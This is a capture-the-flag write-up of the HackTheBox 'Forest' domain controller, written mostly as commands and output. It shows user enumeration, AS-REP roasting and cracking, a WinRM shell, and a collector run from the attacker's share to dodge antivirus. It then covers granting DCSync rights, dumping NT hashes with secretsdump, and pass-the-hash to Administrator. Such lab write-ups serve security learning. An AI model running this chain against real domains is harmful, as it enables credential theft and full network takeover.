---
description: Forest box from HackTheBox write up.
---

# Forest

## Nmap

Let's start as always scanning the box to see what we can do.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- -Pn 10.10.10.161
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 09:44 EST
Nmap scan report for 10.10.10.161
Host is up (0.044s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 27.53 seconds
```

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.10.10.161
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 09:47 EST
Nmap scan report for 10.10.10.161
Host is up (0.048s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-23 14:54:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-11-23T06:57:06-08:00
|_clock-skew: mean: 2h46m52s, deviation: 4h37m08s, median: 6m51s
| smb2-time: 
|   date: 2022-11-23T14:57:05
|_  start_date: 2022-11-23T14:50:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.21 seconds
```

Looks like a domain controller, I will start by checking the SMB and MSRPC services and then I will jump to AD / Kerberos.

## SMB

I tried to enumerate shares with both `enum4linux` and `crackmapexec` but no luck here so I guess we can just move on.

## MSRPC and foothold

At this point I had an idea, I needed to enumerate domain users first so I connected to the MSRPC service and just got a list of them: 

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ rpcclient 10.10.10.161 -U '' -N                                                                              1 ⨯
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

With that we can try the ASPRoast attack.

### ASPRoasting

This attack take advantage of the Kerbetos flag `DONT_REQUIRE_PREAUTH`, allowing an attacker to get the hash of a domain user password to crack it offline. It is not common but maybe we are lucky:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt                                                 1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:c47eacb0574c80a88216f8e0abaa5368$e1bb99f94621eb4c55f70f7fcda83ebafde72babb5a873e85a95303985fef7de0251883fb44dd636cf64883b68ebdc845b7d64a4de4db4b0184ffab017b2b78e6a8b32af527b19a7a2b7a45fcbf32166214a782f943f9660de69b76bf3f72b56a2ef65c5b3272d7e46fef40fb7e2a2dfa8e4ddf5401d31436b8193c936b603329dbd7173fae90e43585c9295c97423de337216227842d6e8dabeb0114f23260d7bb6820eb6373b9ababe7cb5ec156863645f4426017fb115941dcf3c511e3002f91bc0d138fb341d77155217b22f8741b1fc535160143c972792ac95cc95f02d6040a98bcc30
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

And we got a hash! We can now use something like `john` to get the password with the Rockyou dictionary.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ john --wordlist=/home/kali/Wordlists/rockyou.txt hashes    
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:01 DONE (2022-11-23 10:17) 0.5102g/s 2084Kp/s 2084Kc/s 2084KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

As you can see we have now credentials to login to the domain: `svc-alfresco:s3rvice`, I tested with `crackmapexec` if we can use Powershell remoting to get to the machine and looks like we are lucky:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice       
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Using `evil-winrm` we can get a shell into the machine and get the user flag.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'            

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

## Privilege escalation

### Enumeration process

First of all I used the BloodHound Windows collector to get information about the AD. For it, I hosted I samba share in my machine and just executed the binary from the target box. This is great to avoid some AVs:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco> \\10.10.14.20\public\windows\tools\SharpHound.exe
...
*Evil-WinRM* PS C:\Users\svc-alfresco> download C:\Users\svc-alfresco\20221123075411_BloodHound.zip /home/kali/20221123075411_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\20221123075411_BloodHound.zip to /home/kali/20221123075411_BloodHound.zip

                                                             
Info: Download successful!
```

I downloaded the collector results and we can now check for escalation vectors:

<p align="center"><img alt="Screenshot with the privilege escalation vector" src="/assets/images/HackTheBox/Forest/privesc_bloodhound.PNG"></p>

### Pwning time

Here is the idea, as `svc-alfresco` we can add ourselves to the group `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` and then, since we would have `WriteDacl` permissions in the domain, we can just get `DCSync` rights and perform a DCSync attack.

First, I loaded Powerview module to ease some things, you can do this manually too of course. Once that is ready, we can start adding the user `svc-alfresco` to the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` group:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco'
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-DomainUser svc-alfresco


logoncount                    : 8
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
objectclass                   : {top, person, organizationalPerson, user}
displayname                   : svc-alfresco
lastlogontimestamp            : 11/23/2022 7:13:55 AM
userprincipalname             : svc-alfresco@htb.local
name                          : svc-alfresco
objectsid                     : S-1-5-21-3072663084-364016917-1341370565-1147
samaccountname                : svc-alfresco
logonhours                    : {255, 255, 255, 255...}
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : 12/31/1600 4:00:00 PM
countrycode                   : 0
whenchanged                   : 11/23/2022 4:18:27 PM
instancetype                  : 4
usncreated                    : 26083
objectguid                    : 58a51302-4c7c-4686-9502-d3ada3afaef1
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dscorepropagationdata         : {11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM, 11/23/2022 4:19:02 PM...}
givenname                     : svc-alfresco
memberof                      : {CN=Service Accounts,OU=Security Groups,DC=htb,DC=local, CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local}
lastlogon                     : 11/23/2022 7:18:53 AM
badpwdcount                   : 0
cn                            : svc-alfresco
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
whencreated                   : 9/20/2019 12:58:51 AM
primarygroupid                : 513
pwdlastset                    : 11/23/2022 8:18:27 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 1182218
```

Now we have `WriteDacl`, so we can just add permissions to our user to perform the DCSync attack:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $user = "htb\svc-alfresco"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = "s3rvice"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $secstr = New-Object -TypeName System.Security.SecureString
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

I decided to use `impacket-secretsdump` to perform DCSync attack and get all the domain users NT hashes:

```bash
┌──(kali㉿kali)-[~/Public/windows/tools]
└─$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
...
[*] Cleaning up... 
```

**NOTE:** The box will reset all the changes to the AD every 1 minute or so, keep that in mind while executing the commands because you won't make it if you are slow.

Since we have the NT hash of the domain administrator, we can impersonate him and get the flag!

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Forest]
└─$ evil-winrm -i 10.10.10.161 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -s /home/kali/Documents/HTB/Forest

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```
